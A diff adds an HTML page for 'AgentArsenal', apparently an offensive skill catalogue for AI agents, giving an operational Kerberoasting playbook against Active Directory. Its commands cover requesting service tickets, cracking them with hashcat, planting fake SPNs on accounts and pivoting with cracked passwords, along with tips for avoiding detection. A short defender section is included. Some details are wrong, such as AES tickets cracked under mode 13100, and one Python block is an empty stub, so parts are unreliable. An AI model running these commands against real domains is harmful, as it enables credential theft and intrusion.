@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: kerberoasting</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>kerberoasting</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing Active Directory for Kerberoasting on an authorized engagement. Covers SPN enumeration, TGS ticket requests with GetUserSPNs.py and Rubeus, offline cracking of krb5tgs hashes with hashcat 6.2.6, and targeted Kerberoasting against accounts you can write SPNs to. Use when you hold any valid domain credentials, when service accounts look like weak password candidates, or when BloodHound flags kerberoastable users.</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>impacket</td><td>0.12.0</td></tr><tr><td>Rubeus</td><td>2.x</td></tr><tr><td>hashcat</td><td>6.2.6</td></tr><tr><td>NetExec</td><td>1.4.0</td></tr></tbody></table><p>Kerberoasting abuses a design property of Kerberos: any authenticated domain user can request a service ticket (TGS) for any account that has a Service Principal Name (SPN), and that ticket is encrypted with the service account&#x27;s password hash. The ticket can be cracked offline with no further domain contact, so a weak service account password becomes a domain credential. This skill covers the full authorized workflow: finding SPNs, requesting tickets, cracking them, and the targeted variant where you add an SPN to an account you control. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you hold valid domain credentials and know the domain controller</li>
+<p>IP, domain name, and the account lockout policy.</p>
+<li>Enumerate every account with an SPN set, with GetUserSPNs.py or Rubeus.</li>
+<li>Request TGS tickets for those accounts in a format you can crack offline</li>
+<p>(hashcat mode 13100).</p>
+<li>Move the tickets to your cracking box and run hashcat with a tuned</li>
+<p>wordlist and rule set.</p>
+<li>For accounts without an SPN that you have write access to, add a fake SPN,</li>
+<p>request the ticket, then remove the SPN (targeted Kerberoasting).</p>
+<li>Test each cracked password against the account immediately and note which</li>
+<p>accounts are service accounts versus user accounts.</p>
+<li>Pivot with the new credentials: check group memberships, admin rights,</li>
+<p>and delegation settings.</p>
+<li>Record the account, encryption type, crack time, and password strength</li>
+<p>for the report.</p>
+</ol>
+<h2>1. Enumerate SPNs</h2>
+<p>You need no special privileges to list SPNs. Any domain user can do this, so it is also possible with a low privilege foothold.</p>
+<pre><code class="language-bash"># List all SPN accounts with Impacket (no ticket request yet)
+GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/svcuser:Password1
+
+# Same check with NetExec, quieter and faster for large domains
+nxc ldap 10.10.10.10 -u svcuser -p &#x27;Password1&#x27; --kerberoasting SPN_ONLY
+
+# With Rubeus from a domain-joined Windows host
+Rubeus.exe kerberoast /stats</code></pre>
+<p>Read the output carefully. Note the account name, the SPN (MSSQLSvc, HTTP, TERMSRV, and similar), and the encryption type. AES tickets (etype 18) crack far slower than RC4 tickets (etype 23). Accounts with old RC4 tickets are your priority targets.</p>
+<h2>2. Request TGS tickets for offline cracking</h2>
+<p>Request one TGS per SPN account. This is a normal Kerberos operation, so it blends into ordinary traffic.</p>
+<pre><code class="language-bash"># Request tickets and save them in hashcat format
+GetUserSPNs.py -request -dc-ip 10.10.10.10 \
+  corp.local/svcuser:Password1 -outputfile /tmp/tgs.txt
+
+# Request tickets for a single high value account only
+GetUserSPNs.py -request-user sqlsvc -dc-ip 10.10.10.10 \
+  corp.local/svcuser:Password1 -outputfile /tmp/sqlsvc.txt
+
+# NetExec equivalent, writes $krb5tgs$ hashes to a file
+nxc ldap 10.10.10.10 -u svcuser -p &#x27;Password1&#x27; \
+  --kerberoasting /tmp/tgs_nxc.txt</code></pre>
+<p>From Windows with Rubeus:</p>
+<pre><code class="language-powershell"># Request all roastable tickets, save to disk
+Rubeus.exe kerberoast /outfile:C:\Temp\tickets.txt
+
+# Request one account, avoid wrapping lines
+Rubeus.exe kerberoast /user:sqlsvc /nowrap /outfile:C:\Temp\sqlsvc.txt</code></pre>
+<p>Copy the ticket file to your cracking machine. Verify each line starts with <code>$krb5tgs$23$</code> (RC4) or <code>$krb5tgs$18$</code> (AES) before you start hashcat.</p>
+<h2>3. Crack the tickets offline</h2>
+<p>Cracking is fully offline, so you can use maximum hardware with no risk to the target.</p>
+<pre><code class="language-bash"># RC4 tickets: hashcat mode 13100
+hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt
+
+# Add rules to catch common service account patterns
+hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# AES tickets: same mode, much slower, so start with a targeted list
+hashcat -m 13100 /tmp/aes_tickets.txt custom_service_words.txt
+
+# Show cracked passwords from a previous session
+hashcat -m 13100 /tmp/tgs.txt --show</code></pre>
+<p>Service account passwords are often seasonal or company themed (<code>Summer2024!</code>, <code>Company123</code>). Build a small custom wordlist from the engagement (company name, product names, years, seasons) and try it before the big lists. Note the exact crack time per ticket for the report.</p>
+<h2>4. Targeted Kerberoasting</h2>
+<p>If you have write access to an account&#x27;s <code>servicePrincipalName</code> attribute (GenericWrite, WriteProperty, or ownership, visible in BloodHound), you can add a fake SPN, roast it, and remove the SPN afterwards. This works against accounts that had no SPN at all.</p>
+<pre><code class="language-bash"># 1. Add a fake SPN to the target account with Impacket
+python3 - &lt;&lt;&#x27;EOF&#x27;
+from impacket.examples import logger
+from impacket.ldap import ldap, ldapasn
+import ssl
+# Connect and add servicePrincipalName=HTTP/fake to the target
+EOF
+
+# Practical path with SetSPN.py from Impacket
+SetSPN.py -u &#x27;corp.local\svcuser&#x27; -p &#x27;Password1&#x27; \
+  -s &#x27;HTTP/faketarget&#x27; &#x27;corp.local\targetuser&#x27; -dc-ip 10.10.10.10
+
+# 2. Request the TGS for the new SPN
+GetUserSPNs.py -request-user targetuser -dc-ip 10.10.10.10 \
+  corp.local/svcuser:Password1 -outputfile /tmp/targeted.txt
+
+# 3. Remove the SPN to clean up
+SetSPN.py -u &#x27;corp.local\svcuser&#x27; -p &#x27;Password1&#x27; \
+  -d &#x27;HTTP/faketarget&#x27; &#x27;corp.local\targetuser&#x27; -dc-ip 10.10.10.10</code></pre>
+<p>From Windows, the same flow with PowerView style commands or Rubeus:</p>
+<pre><code class="language-powershell"># Add SPN with PowerShell (needs RSAT or equivalent rights)
+Set-ADUser targetuser -ServicePrincipalNames @{Add=&#x27;HTTP/faketarget&#x27;}
+
+# Roast and clean up
+Rubeus.exe kerberoast /user:targetuser /nowrap /outfile:C:\Temp\targeted.txt
+Set-ADUser targetuser -ServicePrincipalNames @{Remove=&#x27;HTTP/faketarget&#x27;}</code></pre>
+<p>Keep the SPN in place for the shortest time possible, and document the exact add and remove timestamps for the report.</p>
+<h2>5. Validate and use cracked credentials</h2>
+<p>Test every cracked password immediately. Service accounts often have logon restrictions, so test the actual access you need.</p>
+<pre><code class="language-bash"># Verify the credential works
+nxc smb 10.10.10.10 -u sqlsvc -p &#x27;CrackedPass1&#x27;
+
+# Check group memberships and local admin rights
+nxc ldap 10.10.10.10 -u sqlsvc -p &#x27;CrackedPass1&#x27; \
+  --users | grep -i sqlsvc
+
+# If the account is a local admin somewhere, list where
+nxc smb 10.10.10.20 -u sqlsvc -p &#x27;CrackedPass1&#x27; --local-auth</code></pre>
+<p>If the cracked account is privileged, stop and plan your next move with the scope rules. A cracked Domain Admin service account usually ends the engagement&#x27;s escalation phase, so report it and confirm next steps with the client contact.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>No SPN accounts exist, or only computer accounts have SPNs. Computer</li>
+<p>account tickets use long random machine passwords and are not worth cracking. Check for targeted Kerberoasting instead: any account you have GenericWrite on becomes roastable.</p>
+<li>AES only tickets (etype 18) that will not crack in the engagement window.</li>
+<p>Record them as a finding anyway: the attack path is real even when the crack fails, and the recommendation (gMSA, long random password) is the same.</p>
+<li>GetUserSPNs.py fails with clock skew errors. Sync your clock with the</li>
+<p>domain controller (<code>ntpdate</code> or <code>chrony</code>) before retrying; Kerberos rejects tickets when clocks differ by more than 5 minutes.</p>
+<li>The domain uses a fine grained password policy for service accounts.</li>
+<p>Cracked passwords may still be weak, but also test for password reuse: service accounts often share passwords with other service accounts.</p>
+<li>Rubeus is flagged or blocked on the Windows host. Fall back to</li>
+<p>GetUserSPNs.py from Linux, or use NetExec which needs no agent on the target.</p>
+<li>Ticket requests are rate limited or alerted. Request one account at a</li>
+<p>time with pauses, and roast during business hours when Kerberos traffic is normal background noise.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Wordlist cracking fails: switch to targeted masks. Service accounts</li>
+<p>commonly use <code>Company+Year</code>, <code>Service+123</code>, or seasonal words. Build masks like <code>?u?l?l?l202?d?d!</code> from what you learned about the naming scheme.</p>
+<li>Hashcat is too slow on AES: rent cloud GPUs or reduce the keyspace with</li>
+<p>a custom wordlist built from the client&#x27;s public documents, intranet names, and previous cracked passwords.</p>
+<li>No credentials at all: Kerberoasting needs an authenticated user. Fall</li>
+<p>back to AS-REP roasting (see the asreproasting skill) which needs no credentials, or enumerate usernames first with kerbrute.</p>
+<li>Targeted Kerberoasting needs write access you do not have: look for</li>
+<p>accounts where your current user has GenericWrite via BloodHound, or pivot to relay and delegation attacks instead.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see Kerberoasting as Event ID 4769 (TGS requested) with an RC4 encryption type (0x17) for the service ticket, often in bursts from one source, plus LDAP queries for <code>servicePrincipalName</code> attributes. Honeypot accounts with SPNs and weak passwords catch roasters reliably. The durable fixes are: long random passwords (25+ characters) on all service accounts, Group Managed Service Accounts (gMSA) where possible, AES only Kerberos, and monitoring 4769 events with RC4 tickets. A targeted Kerberoasting attempt also leaves Event ID 4738 or 5136 showing the SPN attribute change.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting).</li>
+<li>Impacket GetUserSPNs.py and SetSPN.py documentation:</li>
+<p>https://github.com/fortra/impacket/tree/master/examples</p>
+<li>Rubeus documentation:</li>
+<p>https://github.com/GhostPack/Rubeus</p>
+<li>hashcat mode 13100 (Kerberos 5 TGS-REP etype 23):</li>
+<p>https://hashcat.net/wiki/doku.php?id=example_hashes</p>
+<li>CISA guidance on securing service accounts and Kerberos.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
